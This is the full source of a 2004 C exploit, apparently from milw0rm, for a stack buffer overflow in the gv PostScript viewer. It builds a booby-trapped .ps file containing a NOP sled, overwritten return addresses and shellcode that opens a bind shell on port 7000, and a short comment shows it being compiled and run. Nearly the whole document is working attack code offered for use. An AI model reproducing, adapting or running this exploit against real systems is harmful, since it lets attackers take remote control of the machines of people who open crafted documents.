<html><head><title>GV PostScript Viewer Remote Buffer overflow Exploit
</title></head><pre>/*
 * gv postscript viewer exploit , infamous42md AT hotpop DOT com
 *
 * run of the mill bof.  spawns a remote shell on port 7000.  woopty doo. if
 * someone has been able to exploit the heap overflow in cfengine, please email
 * me and teach me something. after days of pain i've concluded it's not 
 * possible b/c you can't manipulate the heap enough to get anything good in 
 * front of you.  please prove me wrong so i can learn.
 *
 * shouts to mitakeet
 *
 *  [n00b localho outernet] netstat -ant | grep 7000
 *  [n00b localho outernet] gcc -Wall -o gvown gvown.c
 *  [n00b localho outernet] ./gvown 0xbffff350
 *  [n00b localho outernet] ./gv h4x0ring_sacr3ts_uncuv3red.ps 
 *  [n00b localho outernet] netstat -ant | grep 7000
 *  tcp        0      0 0.0.0.0:7000            0.0.0.0:*               LISTEN   
  
 */
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;

#define NOP 0x90
#define NNOPS 512
#define die(x) do{perror(x); exit(EXIT_FAILURE);}while(0)
#define BS 0x10000
#define RETADDR_BYTES 400
#define PS_COMMENT &quot;%!PS-Adobe- &quot;
#define OUTFILE &quot;h4x0ring_sacr3ts_uncuv3red.ps&quot;


/* call them on port 7000, mine */
char remote[] =
&quot;\x31\xc0\x50\x50\x66\xc7\x44\x24\x02\x1b\x58\xc6\x04\x24\x02\x89\xe6&quot;
&quot;\xb0\x02\xcd\x80\x85\xc0\x74\x08\x31\xc0\x31\xdb\xb0\x01\xcd\x80\x50&quot;
&quot;\x6a\x01\x6a\x02\x89\xe1\x31\xdb\xb0\x66\xb3\x01\xcd\x80\x89\xc5\x6a&quot;
&quot;\x10\x56\x50\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x6a\x01\x55\x89\xe1\x31&quot;
&quot;\xc0\x31\xdb\xb0\x66\xb3\x04\xcd\x80\x31\xc0\x50\x50\x55\x89\xe1\xb0&quot;
&quot;\x66\xb3\x05\xcd\x80\x89\xc5\x31\xc0\x89\xeb\x31\xc9\xb0\x3f\xcd\x80&quot;
&quot;\x41\x80\xf9\x03\x7c\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62&quot;
&quot;\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;;
    

int main(int argc, char **argv)
{
    int len, x, fd;
    char    buf[BS];
    u_long  retaddr;

    if(argc &lt; 2){
        fprintf(stderr, &quot;Usage: %s &lt; retaddr &gt;\n&quot;, argv[0]);
        return EXIT_FAILURE;
    }
    sscanf(argv[1], &quot;%lx&quot;, &amp;retaddr);

    /* create 3vil buf */
    memset(buf, NOP, BS);
    strcpy(buf, PS_COMMENT);
    len = strlen(buf);
    for(x = 0; x &lt; RETADDR_BYTES - 3; x += sizeof(retaddr))
        memcpy(buf+x+len, &amp;retaddr, sizeof(retaddr));
    len += x + NNOPS;
    strcpy(buf+len, remote);
    strcat(buf+len, &quot;\n&quot;);
    len += strlen(remote) + 1;   /* + NULL */

    /* create the 3vil file */
    if( (fd = open(OUTFILE, O_RDWR|O_CREAT|O_EXCL, 0666)) &lt; 0)
        die(&quot;open&quot;);
    
    if(write(fd, buf, len) &lt; 0)
        die(&quot;write&quot;);

    close(fd);
    
    return 0;
}

// milw0rm.com [2004-08-13]</pre></html>